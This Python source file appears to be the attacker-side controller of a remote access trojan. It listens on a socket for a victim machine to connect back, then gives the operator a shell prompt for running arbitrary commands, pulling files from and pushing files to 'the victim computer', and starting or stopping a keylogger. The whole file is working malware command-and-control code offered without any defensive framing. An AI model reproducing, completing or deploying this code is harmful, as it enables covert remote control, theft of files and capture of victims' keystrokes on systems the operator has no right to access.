import socket
import data
import json
import time
import base64
import fullkeylogger


class Listener:
    def __init__(self):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((data.Initialize.ip, data.Initialize.port))
        listener.listen(0)
        print("[+] Waiting for a connection from remote host")
        self.connection, address = listener.accept()
        print("[+]Got a connection from " + str(address))
        self.hostname = self.execute('whoami')

    def reliable_send(self, byte):
        json_data = json.dumps(byte)
        self.connection.sendall(json_data.encode('utf-8'))

    def reliable_receive(self):
        json_data = ''.encode('utf-8')
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute(self, command):
        self.reliable_send(command)
        return self.reliable_receive()

    def read(self, path):
        with open(path, "rb") as out_file:
            return base64.b64encode(out_file.read())

    def write(self, path, content):
        with open(path, "wb") as f:
            f.write(base64.b64decode(content))
            return "[+]Your file is Downloaded. Find it at " + path

    def run(self):
        while True:
            command = input('[' + self.hostname.rstrip() + '] ' '>> ').split(" ")
            if command[0] == 'exit':
                result = self.execute(command)
                print(result)
                time.sleep(5)
                self.connection.close()
                exit(0)

            elif command[0] == 'download':
                #result = self.execute(command).encode('utf-8')
                result = self.execute(command)
                print(result)
                print(command)
                try:
                    result = self.write(command[2], result)
                except:
                    print("[-]Enter the Destination directory properly")
                    x = input('[*] Do you want the file in the same destination? [Y/n]>> ')
                    if x == 'y' or x == 'Y' or x == 'Yes' or x == 'yes':
                        try:
                            result = self.write(command[1], result)
                        except:
                            result = '[+]The file doesn\'t exist or you haven\'t given a path to be downloaded from'
                    elif x == 'n' or x == 'no' or x == 'N' or x == 'NO':
                        result = 'Rerun command with your location'
                print(result)
            elif command[0] == 'upload':
                if len(command) > 3:
                    print("Only enter command, file to be uploaded and location on victim computer")
                elif len(command) == 3:
                    try:
                        xyz = self.read(command[1])
                        print(xyz)
                        command.append(xyz.decode('utf-8'))
                        print(command)
                        result = self.execute(command)
                        print(result)
                    except:
                        print("[-]Please give a proper path for the file to be uploaded")
                elif len(command) == 2:
                    try:
                        xyz = self.read(command[1])
                        print(xyz)
                        command.append(xyz.decode('utf-8'))
                        print(command)
                        result = self.execute(command)
                        print(result)
                    except:
                        print("[-]Please give a proper path for the file to be uploaded")
                else:
                    print('Please do not abuse program')
            elif command[0] == 'start_keylog':
                result = self.execute(command)
                print(result)
            elif command[0] == 'stop_keylog':
                result = self.execute(command)
                print(result)
            else:
                result = self.execute(command)
                print(result)
